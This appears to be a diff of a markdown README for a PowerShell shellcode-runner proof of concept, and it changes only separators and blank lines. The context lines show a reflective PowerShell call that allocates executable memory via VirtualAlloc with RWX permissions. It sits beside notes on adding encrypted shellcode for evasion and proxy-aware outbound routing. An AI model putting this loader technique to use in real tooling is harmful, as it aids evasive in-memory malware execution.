@@ -163,10 +163,9 @@ LPVOID VirtualAlloc(
 );
 ```
 
----
+
 Modified POC
 ---
-
 ```
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
 (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
@@ -190,14 +189,12 @@ DWORD WaitForSingleObject(
   DWORD  dwMilliseconds
 );
 ```
----
+
 Room for Improvement
 ---
 * system proxy awareness - To ensure the client can route outwards if a system proxy is present
 * encrypted shellcode support - Another layer of evasion
 
-
----
 Additional Sources
 ---
 * https://www.powershellgallery.com/packages/HackSql/1.0.2/Content/Get-DelegateType.ps1
